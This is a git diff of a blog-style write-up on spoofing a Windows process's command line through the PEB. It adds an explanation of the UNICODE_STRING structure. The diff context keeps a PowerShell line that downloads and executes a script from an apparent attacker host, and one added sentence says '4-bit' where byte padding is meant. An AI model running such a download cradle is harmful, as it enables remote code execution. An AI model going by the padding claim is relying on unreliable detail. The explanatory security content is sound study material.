@@ -21,11 +21,22 @@ powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://atta
 
 Note this example is not great since the length of the old commandline is smaller than the new commandline length - we will discuss that shortly.
 
-## Background - PEB
+## Background - PEB and UNICODE_STRING
 I did mention what the PEB is in the past [when I talked about shellcodes](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/), but for the sake of completion, I will mention it briefly here too.  
 The [Process Environment Block (PEB)](https://en.wikipedia.org/wiki/Process_Environment_Block) is a semi-documented data structure in Windows, meant to be a semi userland copy of the kernel [EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm) structure.  
 The motivation for keeping two structures is to save costs - for instance, by consulting the `PEB`, a process can know what DLLs are loaded to it or what commandline it has without consulting the kernel.  
-Specifically, we are going to care about the fact the process's commandline is also resident in its PEB.
+Specifically, we are going to care about the fact the process's commandline is also resident in its PEB.  
+Also note there is a well-known data structure for handling strings all across Windows (both in kernel and userland) - [UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string). That data structure describes wide strings, and is *not* a flat structure:
+```c
+typedef struct _UNICODE_STRING {
+  USHORT Length;
+  USHORT MaximumLength;
+  PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+```
+
+The `Buffer` points to the actual wide string (note it's just a pointer), while the `Length` corresponds to the string's length (in bytes), *excluding* the NUL terminator. Lastly, the `MaximumLength` corresponds to the string buffer's capacity (in bytes), *including* the NUL terminator.  
+Note: on 64-bit systems, there is a 4-bit padding between `MaximumLength` and `Buffer` to make the `Buffer` member 8-byte aligned.
 
 ## Previous known work
 In this section, I will try to describe the main logic that can be found in many places all over the internet.  
